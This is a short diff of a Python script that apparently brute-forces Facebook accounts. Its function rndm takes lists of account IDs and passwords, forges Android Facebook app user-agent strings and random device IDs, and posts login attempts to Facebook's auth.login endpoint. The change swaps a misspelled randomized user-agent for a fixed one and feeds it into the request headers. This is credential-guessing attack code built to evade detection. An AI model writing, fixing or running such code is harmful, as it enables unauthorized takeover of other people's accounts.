@@ -670,7 +670,7 @@ def rndm(ids,passlist):
                                 gttt=random.choice(xxxxx)
                                 ua=random.choice(munir1)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/INFINIXjazz;FBBD/infinix;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -706,7 +706,7 @@ def rndm(ids,passlist):
     "sec-fetch-site": 'none',
     "sec-fetch-user": '?1',
     "upgrade-insecure-requests": '1',
-    "user-agent": munir(),
+    "user-agent": ua_string,
 }
                                 url = 'https://mbasic.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
